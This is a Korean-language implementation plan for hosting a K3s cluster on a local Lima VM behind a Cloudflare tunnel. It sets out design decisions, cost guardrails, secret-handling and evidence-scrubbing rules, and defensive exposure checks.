# M1 인프라 기초 Implementation Plan — 로컬 Lima VM + Cloudflare Tunnel

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.
>
> **이 문서의 지위:** M1의 **현재 실행 기준**이다 (사용자 결정 2026-11-20). `docs/superpowers/plans/2026-11-11-m1-infra-foundation.md`(OCI 대상)는 이후 OCI 이전을 위해 보관만 하며, 그 Task 2~11은 이 문서의 Task 2~12로 대체된다. Task 1은 이미 완료됐다. 아래 "사용자 결정"(D1~D9)과 "확정된 결정"(Q1~Q23과 후속 결정: 결정 N1~N4, S1, 시연, 콘솔, 입력)은 다시 결정하지 않는다.

**Goal:** 사용자의 MacBook 위 Lima VM(Ubuntu 24.04 arm64, 2 CPU / 12 GiB / 100 GiB) 한 대에 K3s를 올리고, **외부 인바운드 경로를 하나도 두지 않은 채** VM 호스트의 cloudflared(이름 있는 터널)를 통해 `safedesk.whoareryu.cloud`, `minishop.whoareryu.cloud`, `relay.whoareryu.cloud` 세 호스트가 Cloudflare 에지 → 터널 → Traefik(Let's Encrypt DNS-01 인증서, 원본 인증서 검증) 경로로 더미 앱을 서비스하며, 5개 앱 네임스페이스가 처음부터 PSA `restricted` + default-deny NetworkPolicy 아래에 있고, Cloudflare 무료 에지 통제(봇·WAF·rate limit·국가 차단·Managed Challenge·캐시 우회)와 비용 가드레일이 켜져 있음을 스크립트와 대시보드 증거로 증명한다.

**Architecture:** 호스트 설정(Lima VM 정의, 하드닝, K3s, cloudflared)은 멱등 셸 스크립트와 Lima YAML로, 클러스터 설정은 Kustomize(`k8s/base` + `k8s/overlays/{local,oci}`)와 K3s 자동 배포 매니페스트(`HelmChartConfig`)로 관리한다. 로컬 VM에는 호스트 방화벽을 두지 않으며(Q13), 인바운드 노출 0은 Lima 네트워크·포트 포워드 설정과 Mac 쪽 리스닝 소켓·도달성 검사로 증명한다. 호스트 스크립트는 Lima 전용 명령을 쓰지 않고 Ubuntu 24.04 일반 명령만 써서 이후 OCI VM에서도 같은 코드가 돌 수 있게 **구조만** 맞춘다 (OCI 동작은 미검증, future). Cloudflare 대시보드 작업은 런북(수동)으로 하고, 그 결과는 읽기 전용 API 내보내기, 외부 관측 검증 스크립트, 캡처로 증명한다. 각 Task는 "검증 스크립트 작성 → 실패 확인 → 적용 → 통과 → 커밋" 순서를 따른다.

**Tech Stack:** macOS(Apple Silicon) + Lima(vz) Ubuntu 24.04 arm64, K3s(내장 Traefik v3, ServiceLB, kube-router NetworkPolicy, metrics-server), cert-manager(Helm) + Let's Encrypt **DNS-01(Cloudflare)**, Cloudflare Free(DNS, Universal SSL, Tunnel, WAF 무료 기능, Bot Fight Mode, Cache Rules), cloudflared(VM 호스트 systemd), Kustomize, GitHub Actions(국가 차단 외부 관측 전용 수동 워크플로), bash 3.2 호환, curl, dig, lsof, jq, testssl.sh(선택).

**Spec:** `docs/2026-11-11-secure-ax-k3s-design.md` (§3, §10, §11, §15, §17.1, §19, §20, 부록 A). 근거 ADR: 0001, 0002, 0003, 0008, 0010(로컬 보류), 0014(호스팅: 로컬 Lima), 0015(공개 접근: Cloudflare 터널). 이 계획의 D1~D9·Q1~Q23은 기획서 v5의 U21~U32, 후속 결정 S1·시연·콘솔·입력은 U33~U34, 결정 N1~N3·N2a·N2b·Zone:Zone:Read 승인·증거 가림 규칙은 U35와 같은 결정이다 (맨 끝 "관련 문서").

## 사용자 결정 (이 계획의 전제, 재결정 금지)

| ID | 결정 |
|---|---|
| D1 | 당분간 OCI 미사용. 런타임은 MacBook의 Lima VM(Ubuntu 24.04 arm64, 2 CPU / 12 GiB = OCI A1과 동일해 §15.1 예산 유지). VM은 포트폴리오를 보여줄 때만 켠다 |
| D2 | 확장성은 **구조만**: `TARGET=local\|oci`, `k8s/overlays/oci`는 자리만, OCI 런북은 "future". 호스트 스크립트는 Lima VM과 향후 OCI VM 양쪽에서 돌도록 작성하되 **검증되지 않은 OCI 전용 코드는 계획하지 않는다** |
| D3 | 공개 접근: Cloudflare 이름 있는 터널. cloudflared는 **VM 호스트의 systemd 서비스**(클러스터 밖). 그래서 "클러스터 안의 상시 외부 egress는 audit-anchor(N20)뿐" 원칙이 유지된다. 터널 ingress는 세 호스트 → Traefik 443(HTTPS, 원본 인증서 검증)과 catch-all `http_status:404`뿐. 6443 등 그 밖의 어떤 것도 노출하지 않는다 |
| D4 | 도메인 `whoareryu.cloud`(가비아 등록, 네임서버는 이미 Cloudflare). apex와 `www`는 Vercel을 가리키며 **건드리지 않는다**. 호스트는 1단계 서브도메인 3개(무료 Universal SSL 범위) |
| D5 | 원본 TLS: cert-manager + Let's Encrypt **DNS-01**, Cloudflare API 토큰은 이 zone 하나의 DNS 편집으로 제한, 저장소 밖에만 보관. staging 먼저 → prod (promote-prod 가드 유지). DuckDNS + HTTP-01을 대체 |
| D6 | 공개 링크는 Mac이 켜져 있는 동안 누구나 접근 (Cloudflare Access 로그인 없음). 대신 (a) 위험한 외부 접근 (b) 비용 발생 (c) 개인정보 수집 경로를 강하게 막는다: 합성 데이터만 + 공개 모드 가입 비활성(§17.1), 자유 입력란은 허용하되 "실제 개인정보 입력 금지" 경고·길이 제한(문의 500자, 배송 메모 100자, 초과는 `maxlength` + 서버 400 안내로 거부·자르지 않음 — M3/M6)·짧은 보존(약 1시간 초기화, 물리 삭제). 무료 Cloudflare 통제 전부 사용. 결제수단 확인·제거, 금지 유료 기능 목록, 월간 청구 화면 캡처(CG10) |
| D7 | 정직한 한계: Cloudflare 에지가 TLS를 종료해 평문을 볼 수 있다 → 합성 데이터만 |
| D8 | 관리 접속: kube API는 Lima 포트 포워드(Mac `127.0.0.1:6443` 전용), 셸은 `limactl shell`. Tailscale은 로컬에서 쓰지 않는다 (Q1) |
| D9 | 스크립트는 bash 3.2 호환. Task마다 검증 우선. 커밋에 `Co-Authored-By` 트레일러를 넣지 않는다 |

## 확정된 결정 (Q1~Q23 및 후속 결정, 2026-11-20)

| Q | 주제 | 확정 내용 | 반영 위치 |
|---|---|---|---|
| Q1 | Tailscale | **[사용자 결정]** A — 로컬에서 쓰지 않음. kube API는 Lima `127.0.0.1:6443` 포워드, 셸은 `limactl shell` | D8, Task 4 |
| Q2 | `cert.pem` | **[사용자 결정]** A — 터널 생성·DNS 라우팅 직후 Mac에서 삭제, 필요하면 다시 `tunnel login` | Task 9 |
| Q3 | 터널 관리 방식 | **[사용자 결정]** A — CLI로 생성, 로컬 관리형 `config.yml`(저장소에는 템플릿) | Task 9 |
| Q4 | apex/www 프록시 상태 | **[사용자 결정·사실 확인]** apex/www는 DNS-only(회색)로 Vercel IP를 가리킴. zone 전역 설정은 세 호스트에만 걸린다. 기준선으로 계속 확인 | Task 5, 10, 12 |
| Q5 | DNS-01 토큰 범위 | **[사용자 결정]** B+C — 단일 zone 범위 + Client IP 필터(집 공인 IP) + 만료 6개월 | Task 5 |
| Q6 | 토큰 원본 보관 | **[사용자 결정]** A — Mac 키체인. Secret과 검증 스크립트는 키체인에서 읽음 | Task 5 |
| Q7 | Cloudflare 설정 관리 | **[사용자 결정]** B — 대시보드 수동 적용 + 읽기 전용 API 토큰으로 설정 JSON 내보내기(드리프트 확인) | Task 10 |
| Q8 | 국가 차단 외부 관측 | **[사용자 결정]** A+B — 대시보드 증거 + GitHub Actions 미국 러너 프로브. 봇 챌린지 결과는 따로 표시 | Task 10 |
| Q9 | rate limit | **[사용자 결정]** A — 10초에 5회 초과 → Block 10초 | Task 10 |
| Q10 | WAF 커스텀 규칙 5칸 | **[사용자 결정]** A — R1 KR 외 차단, R2 relay `/console` 챌린지, R3 `/signup` 차단, R4 메서드 허용 목록 GET/POST/HEAD, R5 예비 | Task 10 |
| Q11 | Bot Fight Mode JS Detections와 CSP | **[사용자 결정]** A — 엄격한 CSP 유지, 영향 기록, nonce는 M3에서 재검토 | Task 10 |
| Q12 | 접근 로그 방문자 IP | **[사용자 결정]** A — `Cf-Connecting-Ip` 기록, 보존 7일 이하 | Task 6 |
| Q13 | 로컬 VM 호스트 방화벽 | **[사용자 결정]** B — 로컬에서는 두지 않음. OCI 이전 때 도입. 인바운드 노출은 Lima 설정 + Mac 쪽 소켓·도달성 검사로 증명 | Task 2, 3 |
| Q14 | 더미 이미지 | **[사용자 결정]** A — 고정 문구 정적 응답 이미지(arm64, non-root, digest 고정) | Task 8 |
| Q15 | 에지 캐시 | **[사용자 결정]** A — 세 호스트 Cache Rule Bypass | Task 10 |
| Q16 | 공개 노출 게이트 | **[사용자 결정]** A — M1 더미는 공개. 실제 앱은 공개 모드 통제가 검증된 뒤에만 호스트에 연결 (M3/M6 완료 기준에 추가) | Task 8, 12 (기획서 v5 §20 M3/M6에 반영됨) |
| Q17 | 초기화와 감사 로그 | **[사용자 결정]** A — 앱 데이터·Relay 주체는 1시간마다 물리 삭제, 감사 로그는 유지 (M3 이후 범위) | 범위 밖 (기획서 v5 U27) |
| Q18 | audit-anchor 외부 대상 | **[사용자 결정]** A — M4에서 결정 (후보: 별도 공개 GitHub 저장소 append-only) | 범위 밖 |
| Q19 | M1 미들웨어 범위 | **[사용자 결정]** B — 리다이렉트·보안 헤더 + `body-limit` 64 KiB를 M1에 추가 | Task 8 |
| Q20 | VM 자원 | **[사용자 결정]** A — 2 CPU / 12 GiB / 100 GiB | Task 2 |
| Q21 | "0원" 표현 | **[사용자 결정]** A — README에 "기존 개인 도메인 사용, 프로젝트 추가 비용 0원" | Task 12 |
| Q22 | 터널 자격 증명 JSON 백업 | **[사용자 결정]** A — 백업 없음. 분실 시 터널 재생성·DNS 재라우팅 | Task 9 |
| Q23 | Task 1 인터페이스 변경 위치 | **[사용자 결정]** A — Task 2 Step 0 | Task 2 |
| 결정 N1 | Cloudflare API 호출 주소 계열 (Q5 B) | **[사용자 결정]** IPv4 강제 — `cf_api`는 `curl -4`. Task 5에서 VM에 전역 IPv6 주소·기본 경로가 없음을 확인하고, 클러스터가 IPv4 단일 스택이라 cert-manager의 Cloudflare API 이그레스도 IPv4뿐임을 확인 | Task 5 |
| 결정 N2a | 읽기 전용 내보내기 토큰 제한 (Q7 B) | **[사용자 결정]** DNS 토큰과 같음 — 단일 zone + 집 IP 필터 + 만료 6개월, 원본은 Mac 키체인(`secure-ax-cf-readonly`) | Task 10 |
| 결정 N2b | 내보내기 JSON (Q7 B) | **[사용자 결정]** ID·UUID를 지운 정규화 JSON을 공개 저장소에 커밋해 드리프트 기준선으로 씀. 커밋 전 계정/zone ID·이메일·IP·토큰 부재 검사(pre-commit 훅 포함), gitleaks·cluster-values 훅이 명백한 누출을 잡는지 테스트 | Task 10 |
| 결정 N3 | 로그 7일 보존 방식 (Q12 A) | **[사용자 결정]** Traefik 접근 로그를 VM hostPath 파일로, 호스트 logrotate `daily` + `maxage 7`, 부팅 시·놓친 실행도 회전. 오래된 파일이 실제로 지워짐을 검증 | Task 6, 12 |
| 결정 N4 | README (Q21) | **[사용자 결정]** Task 12에서 최소 `README.md` 생성: 한 줄 소개, "기존 개인 도메인 사용, 프로젝트 추가 비용 0원", "시연은 요청 시 Mac을 켜서 공개합니다. 평소에는 Cloudflare 기본 오류 페이지가 나오며, 영상·캡처를 참고해 주세요."(이 문장 그대로), 문서 링크 | Task 12 |
| S1 | 기획서 S1 대체 | **[사용자 결정]** "외부 nmap 80/443" → C4/C5 방식(설정·리스너·도달성·터널 감사·공개 호스트 음성 검사)을 받아들이고, **같은 LAN의 다른 실제 기기(예: 다른 노트북, Termux에서 nmap을 돌리는 휴대폰)에서 Mac LAN IP를 nmap 스캔**해 VM 포트가 Mac 밖으로 새지 않음을 증거로 추가. 이것이 기본 증거이고, Mac의 Docker 컨테이너(`make lan-scan`)는 대체 수단일 뿐이며 쓰면 "실제 LAN이 아니라 Docker Desktop VM 네트워크를 거쳤을 수 있다"는 한계를 증거에 적는다. 18090 대조 포트를 macOS 애플리케이션 방화벽이 막으면 스캔하는 동안만 python을 허용하고 끝나면 허용을 지우며, 쓴 포트와 허용 내역을 증거에 적는다 | Task 3, 12 |
| LAN 스캔 기기 | S1 기본 증거를 찍는 기기 | **[사용자 결정]** (2026-11-20) 같은 LAN의 다른 노트북 또는 Termux에서 nmap을 돌리는 휴대폰 (둘 다 `-oG` 출력이라 `m1-lan-scan.sh`가 읽음). 그 밖의 스캔 앱 결과는 인정하지 않는다. Docker(`make lan-scan`)는 한계 문장을 붙인 대체 수단 | Task 3, 12 |
| 시연 | 시연 켜기·끄기 | **[사용자 결정]** `make demo-up`은 VM 시작 + `caffeinate` + 시계 차이 확인, `make demo-down`은 `caffeinate` 해제 **그리고 VM 정지**(평소에는 공개 호스트가 Cloudflare 기본 오류 화면). 두 타깃 모두 M1 Task 12에서 만든다 (M9는 시드·데모 계정 단계만 더함) | Task 12 |
| 콘솔 | relay 콘솔 보호 | **[사용자 결정]** `console-ipallow` 미들웨어는 쓰지 않음. 에지 Managed Challenge(R2) + rate limit + 상담원 TOTP로 보호 | Task 8, 10 (TOTP는 M4) |
| 입력 | 자유 입력 길이 | **[사용자 결정]** 문의 500자, 배송 메모 100자. 초과 시 브라우저 `maxlength` + 서버에서 400과 사용자용 안내 문구로 거부하며 **조용히 자르지 않는다** (앱이 생기는 M3/M6에서 구현, M1은 참조만) | 범위 밖 |
| 토큰 권한 | DNS-01 토큰·읽기 전용 토큰의 Zone:Zone:Read | **[사용자 결정]** 두 토큰 모두 **Zone · Zone · Read**를 추가로 가진다 (cert-manager Cloudflare 솔버가 zone ID 조회에 필요 — 기술적 필요 → 사용자 승인 2026-11-20). DNS-01 토큰 = Zone·DNS·Edit + Zone·Zone·Read, 읽기 전용 토큰 = 설정 읽기 권한들 + Zone·Zone·Read. 그 밖의 권한은 없다 | Task 5, 10 |
| 신뢰 프록시 | Traefik `forwardedHeaders.trustedIPs` | **[Claude 제안, 실측 대기]** cloudflared → Traefik 연결의 출발 주소 /32 하나. 기본값은 `<NODE_IP>/32`이고 Task 9에서 실측해 확정한다 (노드 IP가 아니면 실측값으로 바꾸고 기록) | Task 6, 9 |

## 기존 계획 대비 변경 요약

| 기존 (OCI) | 개정 (local + Cloudflare) |
|---|---|
| Task 1 저장소 뼈대 | **완료** (7ca8306, 93e0deb). 인터페이스 변경은 Task 2 Step 0 (Q23) |
| Task 2 OCI VM + 비용 가드레일 | Task 2 Lima VM 정의(네트워크·마운트·포워드 설정 검증) + 호스트 검증 |
| Task 3 하드닝, iptables 80/443, Tailscale SSH | Task 3 하드닝 + **인바운드 노출 증명**(호스트 방화벽 없음, Q13). Tailscale 미사용(Q1) |
| Task 4 K3s, Tailscale 전용 API | Task 4 K3s, API는 Mac `127.0.0.1:6443`(Lima 포워드)로만 |
| Task 5 DuckDNS + 갱신 타이머 | Task 5 Cloudflare 계정·비용 점검, DNS 기준선(apex/www 불변), DNS-01 토큰, cert-manager + ClusterIssuer(DNS-01) — 기존 Task 7 흡수 |
| Task 6 Traefik | Task 6 Traefik (신뢰 프록시 범위, `sniStrict`, 방문자 IP 로그 7일 이하) |
| Task 7 cert-manager HTTP-01 | (Task 5로 통합) |
| Task 8 ns/PSA/default-deny/N1/N5 | Task 7 ns/PSA/default-deny/N1. **N5 폐지** (DNS-01이라 솔버 Pod 없음) |
| Task 9 더미 + HTTPS(공인 IP) | Task 8 더미 + 미들웨어(`body-limit` 포함) + 인증서 staging→prod (원본 측 검증, VM 안에서 `--resolve`) |
| — | Task 9 cloudflared 터널(VM 호스트 systemd) + 터널 경유 공개 HTTPS |
| — | Task 10 Cloudflare 에지 통제 + 설정 내보내기 + 국가 차단 외부 관측 + 비용 재확인 |
| Task 10 netmatrix | Task 11 netmatrix (N5 행 제거, cloudflared·Cloudflare API·터널 이그레스 음성 검사 추가) |
| Task 11 통합 검증, 재부팅 | Task 12 통합 검증, VM stop/start·Mac 잠자기 내구성, 증거, README·완료 기준 갱신 |

**N5(ACME HTTP-01 솔버 허용) 처리:** DNS-01에서는 cert-manager가 Cloudflare API로 `_acme-challenge` TXT를 만들 뿐 앱 네임스페이스에 솔버 Pod/Ingress를 만들지 않는다. 그래서 `allow-acme-solver-ingress` 정책은 **만들지 않는다**. 기획서 §10의 N5 행은 "폐지(DNS-01 전환, 2026-11)"로 표시하고 번호는 재사용하지 않는다. cert-manager 컨트롤러(`cert-manager` ns, 1차에는 NP 없음 — §10 빌더 재량 유지)는 `api.cloudflare.com:443`과 DNS(53)로 나가야 하며, 이는 §10 본문의 "플랫폼 구성요소(cert-manager의 ACME)" 예외에 그대로 포함된다.

## Global Constraints

- **비용 0원 (추가 비용 기준).** OCI 관련 CG1~CG4, CG8은 `TARGET=oci`가 될 때까지 **보류**(삭제하지 않음). 새로 적용하는 규칙:
  - CG-CF1: Cloudflare 계정은 **Free 플랜만**. zone 플랜 업그레이드, 애드온 구매 금지.
  - CG-CF2: 결제수단 확인. 등록돼 있으면 제거를 시도하고, 제거할 수 없으면 그 사실과 "구독 0개" 화면을 증거로 남긴다 (Task 5 런북). 결제 정보 입력을 요구하는 화면(예: Zero Trust 온보딩)이 나오면 진행하지 않는다.
  - CG-CF3: **금지 유료 기능** (목록을 두는 것은 사용자 결정, 아래 항목 구성은 **[Claude 제안]**) — Argo Smart Routing, Load Balancing, Workers Paid, R2(결제수단 연결 필요), Advanced Certificate Manager, Total TLS, Spectrum, Images/Stream, Waiting Room, Page Shield·Advanced Rate Limiting·Bot Management(유료), Logpush, Zaraz 유료, Zero Trust 유료 좌석, Pro/Business/Enterprise 플랜, Registrar 이전(도메인은 가비아 유지). 대시보드에서 "Upgrade/Purchase/Enable(유료)" 버튼을 누르지 않는다.
  - CG-CF4: 월 1회 Cloudflare Billing(구독, 청구서) 화면 캡처를 `docs/cost/`에 남긴다 (CG10 확장).
  - CG5(공개 저장소 + gitleaks), CG6(GHCR, arm64, digest 고정), CG9(외부 유료 API 금지), CG10(월간 비용 증거)은 그대로. CG7은 "Let's Encrypt, Cloudflare Free"로 바꾼다.
  - 비용 표현: "기존 개인 도메인 사용, 프로젝트 추가 비용 0원" (Q21). 도메인 갱신비는 프로젝트 비용에 넣지 않는다.
- **VM (Q20):** Lima `vmType: vz`, Ubuntu 24.04 arm64(`template:ubuntu-24.04` 기반), **2 CPU / 12 GiB / 100 GiB**. **Mac 디렉터리 마운트 없음** (`mounts: []` **[Claude 제안]**): Lima 기본 템플릿은 홈을 읽기 전용으로 마운트하는데, 공개 트래픽을 받는 VM이 Mac 홈(`~/.ssh`, `~/.kube`, 키체인 내보내기 등)을 읽을 수 있으면 안 된다. Lima 2.x의 `template:ubuntu-24.04`는 `base:`로 기본 템플릿을 합성하고 목록 필드는 병합될 수 있으므로, 자식의 `mounts: []`가 상속된 마운트를 실제로 지우는지 Task 2에서 확인한다.
- **인바운드 노출 0 (Q13 — 호스트 방화벽 없음):** 로컬 VM에는 호스트 방화벽을 두지 않는다. 그래서 인바운드 차단은 다음 두 설정에만 의존하며, 둘 다 검증 스크립트가 매번 확인한다 (두 설정의 구체적 형태는 **[Claude 제안]**).
  1. Lima `networks: []` — vzNAT·shared·bridged 네트워크를 쓰지 않는 user-mode 네트워크라 Mac과 LAN에서 VM 주소로 직접 접근할 수 없다.
  2. Lima `portForwards` — **guest 6443 → Mac `127.0.0.1:6443` 하나만** 허용하고 나머지는 catch-all `ignore` (Lima의 SSH 포워드는 끌 수 없으며 `127.0.0.1` 전용). Lima 게스트 에이전트는 K8s LoadBalancer/NodePort 서비스도 자동 포워드하므로(Traefik 80/443 포함) catch-all ignore가 필수다.
  - 호스트 방화벽(nftables 등)은 `TARGET=oci`로 이전할 때 도입한다 (`docs/runbooks/future-oci-vm.md`에 기록, M1에서 구현·검증하지 않음).
- **공개 경로는 터널 하나:** Cloudflare 에지 → cloudflared(VM 호스트) → `https://<NODE_IP>:443`(Traefik). ingress 규칙은 세 호스트 + `http_status:404` catch-all. `noTLSVerify: true` 금지, 호스트별 `originServerName` 지정. `ssh://`, `tcp://`, `rdp://`, `unix:`, `:6443`, `:10250` 서비스 금지.
- **K3s:** `--secrets-encryption`, `--write-kubeconfig-mode 600`. Traefik, ServiceLB, local-path, metrics-server, NetworkPolicy 컨트롤러는 끄지 않는다. `--tls-san`, `--node-external-ip`는 쓰지 않는다 (K3s 서버 인증서에 `127.0.0.1`이 기본 포함 — Task 4에서 확인).
- **비밀값:** Cloudflare API 토큰(DNS-01용, 읽기 전용 내보내기용), cloudflared 터널 자격 증명(JSON)과 `cert.pem`, ACME 이메일, 터널 UUID(`TUNNEL_ID`), kubeconfig는 커밋 금지. 저장 위치:
  - DNS-01 토큰 원본: Mac 키체인 서비스 `secure-ax-cf-dns01` (Q6). 클러스터 사본: K8s Secret `cert-manager/cloudflare-dns01-token`.
  - 읽기 전용 내보내기 토큰 원본: Mac 키체인 서비스 `secure-ax-cf-readonly` (결정 N2a). 클러스터·VM에는 두지 않는다.
  - Cloudflare API 호출은 IPv4로만 (결정 N1): Mac의 `cf_api`·`export-config.sh`는 `curl -4`, VM·클러스터는 IPv6 이그레스가 없음을 검증한다.
  - 터널 자격 증명 JSON: VM `/etc/cloudflared/<TUNNEL_ID>.json`(root:cloudflared 640) **하나만**. Mac 사본과 백업 없음 (Q22).
  - `cert.pem`: 터널 생성·DNS 라우팅 직후 Mac에서 삭제, VM에는 두지 않음 (Q2).
  - gitleaks pre-commit 필수 (CG5). 문서·증거에는 `<TUNNEL_ID>`, `<ZONE_ID>`, `<ACCOUNT_ID>`, `<HOME_IP>`, `<LAN_IP>`, `<GUEST_IP>` 같은 자리표시자만 쓴다.
- **증거 위생 (공개 저장소):**
  - 텍스트 증거(검증 출력, 스캔 결과, 로그 발췌)는 커밋 전에 `scripts/verify/lib/scrub.sh`의 `scrub_evidence <파일>`로 치환한다: Mac 호스트 이름(`scutil --get LocalHostName`, `hostname`), `$HOME` 경로와 사용자 이름(`/Users/<name>` → `/Users/<user>`), MAC 주소, LAN/guest/집 IP, 터널 UUID, 계정·zone ID. 치환 뒤 `check-evidence-clean`(Task 10의 `check-export-clean.sh`와 같은 검사 + 호스트 이름·사용자 이름·MAC 주소)이 rc 0이어야 커밋한다 — pre-commit local 훅으로 `docs/evidence/`와 `docs/cost/`의 텍스트 파일에 건다.
  - nmap은 항상 `-n`(역방향 DNS 조회 안 함)으로 실행해 `Host:` 줄에 기기 이름이 남지 않게 한다.
  - **모든 Cloudflare 대시보드 캡처**는 계정 이메일, 계정 이름, 계정·zone ID, 토큰 ID, 터널 UUID, 집 IP, 카드 정보를 가린 뒤 저장한다. 런북의 각 캡처 단계에 이 규칙을 참조로 적는다. Mac 화면 캡처의 메뉴 막대·창 제목에 사용자 이름이 보이면 함께 가린다.
- **도메인 경계:** apex `whoareryu.cloud`와 `www`의 DNS 레코드·프록시 상태를 바꾸지 않는다 (DNS-only, Vercel IP — Q4). 모든 WAF 커스텀 규칙·rate limit·cache 규칙은 `http.host in {세 호스트}` 조건으로 범위를 제한한다. zone 전체 설정(Bot Fight Mode, SSL 모드, Always Use HTTPS, 최소 TLS)은 프록시된 레코드(세 호스트)에만 적용된다.
- **이미지:** `linux/arm64`, digest 고정, 가능하면 GHCR (CG6). GitHub Actions의 action도 전체 커밋 SHA로 고정한다.
- **Let's Encrypt:** staging으로 먼저, prod는 `promote-prod.sh` 가드로만 (CG7). 같은 등록 도메인(`whoareryu.cloud`)의 주간 한도를 Vercel(apex/www)과 공유할 수 있으므로 prod 재발급을 반복하지 않는다.
- **앱 네임스페이스 5개:** `pii-relay`, `safedesk`, `minishop`, `openbao`, `audit-anchor`. 모두 `pod-security.kubernetes.io/enforce: restricted` + ingress/egress default-deny. 라벨은 ns `kubernetes.io/metadata.name`, Pod `app.kubernetes.io/name`.
- **미들웨어 값(§11.3 + Q19, 헤더·CSP 구체 값은 기획서 §11.3의 **[Claude 제안]**):** HSTS `max-age=31536000; includeSubDomains`(세 호스트의 하위에만 적용되므로 apex/www에 영향 없음), `nosniff`, `Referrer-Policy: no-referrer`, `X-Frame-Options: DENY`, CSP `default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 'self' https://relay.whoareryu.cloud`(Q11: nonce 없이 유지), 원본 `Server` 헤더 제거(에지가 붙이는 `server: cloudflare`는 막을 수 없음 — 검증 기준은 "원본 정보 미노출"), **`body-limit` 요청 본문 64 KiB(65536바이트)**. Traefik TLS 최소 1.2 + `sniStrict`. 대시보드 비노출. 접근 로그에 쿼리스트링, `Cookie`, `Authorization` 미기록. 방문자 IP(`Cf-Connecting-Ip`)는 기록하되 7일 이하 보존 (Q12): 접근 로그는 컨테이너 stdout이 아니라 VM hostPath 파일 `/var/log/traefik/access.log`에 쓰고 호스트 logrotate가 지운다 (결정 N3). `console-ipallow` 미들웨어는 쓰지 않는다 — relay 콘솔은 에지 Managed Challenge(R2) + rate limit + 상담원 TOTP(M4)로 보호한다.
- **Cloudflare 에지 최소 설정:** SSL/TLS 모드 Full (strict), Always Use HTTPS, 최소 TLS 1.2, Rocket Loader·Email Obfuscation 등 HTML 변형 기능 끔(CSP 무결성), 세 호스트 캐시 우회 (Q15).
- **버전 고정:** Lima, K3s, cert-manager 차트, cloudflared, 더미/프로브 이미지, GitHub Actions의 action은 실행 시점 최신 안정판으로 고정하고 `k8s/VERSIONS.md`에 버전·digest·sha256을 기록한다 **[Claude 결정, 기존 유지]**.
- **스크립트 규칙:**
  - bash 3.2 호환(`mapfile`, `${x,,}`, 연관 배열 금지). 날짜 계산은 macOS `date -j`와 GNU `date -d`를 구분하는 헬퍼로.
  - 모든 "차단/거부/부재여야 함" 검사는 `assert_fails_with <msg> [--rc n] [--match ERE] -- cmd`를 쓴다. `assert_fails`는 단순 명령의 일반 실패에만 쓰고, 보안 검사에는 쓰지 않는다. 검증 스크립트의 마지막 명령은 `assert_summary` (실패나 0건이면 return 1).
  - `--match`는 도구 자신만 출력하는 문자열로 고정한다. curl은 `-sS`로 실행하고 `^curl: \(N\)` 접두를 쓴다. ERE에는 `\s` 대신 `[[:space:]]`를 쓴다 (BSD grep 호환).
  - **부재 검사 규칙:** `sh -c "cmd | grep -q ..."`처럼 파이프 안에서 grep하지 않는다. 앞 명령이 실패해도 grep이 "없음"(rc 1)을 돌려줘 거짓 PASS가 되기 때문이다. 대신 (1) 대상 출력을 파일로 받는 명령의 성공을 먼저 assert하고 (2) `assert_fails_with "<msg>" --rc 1 -- grep -Eq '<패턴>' "<파일>"`로 **grep을 직접** 실행한다 (grep: 0 = 있음, 1 = 없음, 2 = 오류 → 오류는 FAIL).
  - 부재 검사의 입력 파일이 **비어 있으면 안 되는 경우**(예: `grep -Ev` 기반 "허용 외 줄 없음" 검사)는 먼저 파일이 비어 있지 않음을 assert한다. 빈 입력이면 `grep -Ev`가 rc 1을 돌려줘 거짓 PASS가 되기 때문이다.
  - `--rc 1` 하나만으로 판정하지 않는다: rc 1이 "없음"과 "오류"를 함께 뜻하는 도구(예: `findmnt`)는 출력을 파일로 받아 grep으로 판정한다.
  - 파일 존재 부재는 `ls`의 rc(GNU 2, BSD 1로 다름)에 기대지 않고 `assert_fails_with "<msg>" --rc 1 -- test -e <경로>`로 확인한다.
  - 두 파일의 동일성은 `assert_eq "$(cat a)" "$(cat b)"` 대신 두 파일이 비어 있지 않음을 먼저 assert하고 `assert_succeeds "<msg>" -- cmp -s a b`로 본다.
  - 음성 검사에는 가능한 한 **양성 대조**를 붙인다 (예: 같은 리스너가 VM 안에서는 응답함을 먼저 확인).
- **커밋:** 메시지 끝에 `Co-Authored-By` 트레일러를 넣지 않는다 (D9).

### curl 종료 코드 기준표 (검증 스크립트에서 `--rc`/`--match`로 사용)

| rc | 의미 | 쓰는 곳 |
|---|---|---|
| 6 | 이름 해석 실패 | 존재하지 않는 서브도메인 |
| 7 | 연결 실패 | Mac `127.0.0.1:443`·`:18080`, Mac LAN IP:6443 |
| 22 | HTTP ≥ 400 (`-f`) | 에지 차단(403), 챌린지(403), rate limit(429), body-limit(413) — `EDGE_CLASS=`/`EDGE_STATUS=` 표식으로 원인 구분 |
| 28 | 시간 초과 | Mac → guest IP(라우팅 불가) — `--match '^curl: \((7\|28)\)'` |
| 35 | TLS 핸드셰이크 실패 | TLS 1.1 강제(`alert protocol version`으로 서버 거부 확인), `sniStrict` 위반 SNI |
| 60 | 인증서 검증 실패 | staging 인증서를 검증 모드로 접속 |

## Review Focus

1. **Lima 포트 포워드 누출** — Lima 게스트 에이전트는 guest의 `0.0.0.0`/`127.0.0.1` 리스너와 K8s LoadBalancer/NodePort 서비스를 Mac `127.0.0.1`로 자동 포워드한다. catch-all ignore가 빠지면 Traefik 443, kubelet 10250, cloudflared metrics가 Mac에 노출된다. → Task 2가 설정을, Task 3이 행동(임시 리스너 음성 검사)과 Mac 리스너 목록을 확인하고, Task 4·9·12에서 `m1-exposure.sh`를 다시 돌린다.
2. **Lima 네트워크 모드 변경 = 직접 노출 (Q13)** — 호스트 방화벽이 없으므로 `networks`에 vzNAT/shared/bridged가 추가되는 순간 VM의 kubelet(10250), sshd(22), Traefik(80/443) 등이 Mac 또는 LAN에 직접 열린다. → `m1-lima.sh`가 `networks` 길이 0을 매번 확인하고, `m1-exposure.sh`가 Mac에서 guest IP로의 연결 실패를 양성 대조와 함께 확인한다. OCI 이전 시 호스트 방화벽을 먼저 도입한다는 사실을 `future-oci-vm.md`에 적는다.
